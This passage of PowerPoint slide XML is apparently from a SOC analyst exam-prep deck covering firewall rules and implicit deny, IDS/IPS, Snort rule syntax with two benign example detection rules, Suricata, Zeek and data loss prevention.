                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Users/Groups</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Local Group Policy Editor</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Linux</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Users/Groups</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Permissions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115</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PERMISSIONS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Permissions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Blacklist</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Deny specific traffic or applications</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Whitelist</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Can use Windows Group Policy Editor</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Disable everything except those explicitly listed</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116</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FIREWALLS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Firewalls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A firewall is a hardware or software control that inspects traffic crossing a network boundary and permits or blocks it based on a defined set of rules, typically expressed as an access control list (ACL) that matches on source/destination IP, port, and protocol.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By enforcing these rules the firewall implements the organization's security policy at network segments, and common enterprise and open-source options include Cisco, Palo Alto, Check Point, Linux ufw, and pfSense.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts review firewall rules and logs to verify segmentation, spot misconfigurations or overly permissive rules, and use allow/deny data as evidence when investigating suspicious connections.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions on rule/ACL ordering, default deny, and choosing an appropriate firewall type for a given segmentation or access requirement.</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117</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FIREWALLS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Firewalls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Operating systems come with firewall built in</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Includes default rules</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Simple firewalls</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Look at protocol, port, source, destination</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Decide if a rule is allowed</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118</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FIREWALLS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Firewall Rules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A firewall rule specifies how to handle a class of traffic, defined by its source, destination, port, protocol, and the action to take (accept/allow or reject/deny).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Rules are typically written from broad, higher-level policies first with more specific exceptions layered afterward, and because most firewalls evaluate rules top-down and act on the first match, order matters greatly.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  An implicit deny at the end blocks anything not explicitly permitted, enforcing a default-deny posture.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst must understand rule structure and ordering to write effective controls, troubleshoot why traffic is or is not passing, and avoid gaps that attackers can exploit.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Questions give a rule set and ask which traffic is allowed or blocked, testing the five rule components, first-match/order sensitivity, and implicit deny.</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119</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FIREWALLS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Firewall Rules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Define higher level rules</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Then exception comes after</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Defines:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Source, destination, port, protocol, action (accept/reject)</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120</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FIREWALLS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Firewalls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Web proxies</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Sit between Web servers and Web clients</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Web application firewalls</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Used for Web traffic</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Operating system firewalls</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  OS level, runs on individual machine</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Device-oriented firewall</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Example: Cisco firewall</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121</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INTRUSION PREVENTION RULES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IDS/IPS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An Intrusion Detection System (IDS) passively inspects network or host activity and raises alerts when it recognizes malicious or policy-violating traffic, while an Intrusion Prevention System (IPS) sits inline and can actively drop or block that traffic in real time.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Detection can be signature-based (matching known attack patterns) or anomaly/behavior-based (flagging deviations from a baseline); Snort began as the open-source engine behind the commercial Sourcefire product later acquired by Cisco, Zeek (formerly Bro) is an open-source network analysis framework that produces rich protocol logs, and Security Onion is a free Linux distribution that bundles Zeek, Snort/Suricata, and other tools to give a comprehensive view of traffic.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst relies on IDS/IPS as a primary source of network telemetry and detections, tuning rules to reduce false positives and correlating alerts with other sources to confirm and scope incidents.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect scenario questions asking you to distinguish detection from prevention and to identify which tool (Snort, Zeek/Bro, Security Onion) fits a given monitoring need.</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122</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INTRUSION PREVENTION RULES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IDS/IPS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Intrusion detection system (IDS)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Intrusion prevention system (IPS)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Like firewalls that take an action against threats</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Filters traffic, compares to rules, then acts</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Example: Snort</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123</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INTRUSION PREVENTION RULES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Snort Rule Building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A Snort rule is built from a rule header and rule options: the header specifies the action, protocol, source IP and port, a direction operator, and destination IP and port, while the options in parentheses define the detection logic and metadata.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  In the header, the action (such as alert, log, drop, or reject) determines what Snort does, the protocol (tcp, udp, icmp, ip) narrows the traffic, and the direction operator -&gt; reads left-to-right from source to destination; variables like $HOME_NET reference defined network ranges.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For example, alert tcp any any -&gt; any 80 (msg:"A web connection was made!"; flow:stateless; rev:1;) alerts on any TCP traffic to port 80, whereas a more advanced rule uses options like content to match a payload byte pattern, byte_test to test specific bytes, flow:to_server to scope direction, and sid/rev to uniquely identify and version the rule.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst writes and tunes Snort rules to detect specific threats precisely, so understanding each field is essential to catch real attacks without drowning in false positives.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect to parse or write a Snort rule, identifying the header fields (action, protocol, source/dest IP and port, direction) and key options like msg, content, flow, sid, and rev.</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124</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INTRUSION PREVENTION RULES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Snort Rule Building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Syntax</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Snort action</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Protocol</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Source IP address</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Source port</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Direction</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Example 1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  alert tcp any any-&gt; any 80 (msg:"A web connection was made!";flow: stateless; rev:1;)</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125</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INTRUSION PREVENTION RULES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Snort Rule Building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Example 2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  alert udp $HOME_NET any -&gt; any 53 (msg:"Suspicious DNS requests for a .buzz domain"; flow:to_server; byte_test:1,!&amp;,0xF8,2; content:"|02|buzz|00|"; reference:url,www.spamhaus.org/statistics/tlds; sid:12345; rev:1;)</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126</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INTRUSION PREVENTION RULES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IPS Rules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An Intrusion Prevention System uses signature and rule-based logic to inspect network traffic in real time and actively block matches, going a step beyond an IDS that only alerts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Suricata is a free, open-source engine that operates as an IDS, IPS, and network security monitor, matching packets against rule sets such as Emerging Threats to fire alerts or drop malicious flows.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Zeek (formerly Bro) complements this by logging events and running scripts against network traffic, producing rich protocol logs so analysts can hunt for anomalies and correlate activity across sessions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst tunes these rules to cut false positives, chains Suricata detection with Zeek context, and relies on both to catch exploitation attempts as they cross the wire.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect scenario questions asking you to distinguish IDS from IPS behavior and to identify Suricata (signature detection/prevention) versus Zeek (protocol logging and scripting) as the right tool for a monitoring goal.</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127</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INTRUSION PREVENTION RULES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IPS Rules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Zeek logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Logs events based on rules</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Runs scripts to analyze events</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Looks for anomalies and correlates data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Suricata</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Free, open-source threat detection engine</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  IDS, IPS, and network monitoring tool</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128</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DLP AND ENDPOINT DETECTION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Data Loss Prevention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Data Loss Prevention (DLP) inspects data in motion, at rest, and in use to detect and block sensitive information such as PII, PHI, or intellectual property from leaving the organization.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Working conceptually like an IDS for data movement, it applies content matching, regular expressions, fingerprinting, and classification labels to identify regulated content and enforce policy actions like block, quarantine, or encrypt.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Many SaaS platforms including Microsoft 365 and Google Workspace embed native DLP policies, extending coverage to email, cloud storage, and collaboration channels where data now flows.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because DLP is a primary control against exfiltration and insider threat, and its alerts feed incident investigations into how and where data was leaked.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam tests DLP as a control that inspects and stops sensitive-data movement, and may ask you to recognize when a DLP alert indicates attempted exfiltration versus a false positive.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129</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DLP AND ENDPOINT DETECTION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Data Loss Prevention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Similar to IDS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Inspects traffic of data movement</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Goal is to limit data leakage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Some SaaS solutions provide DLP options</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
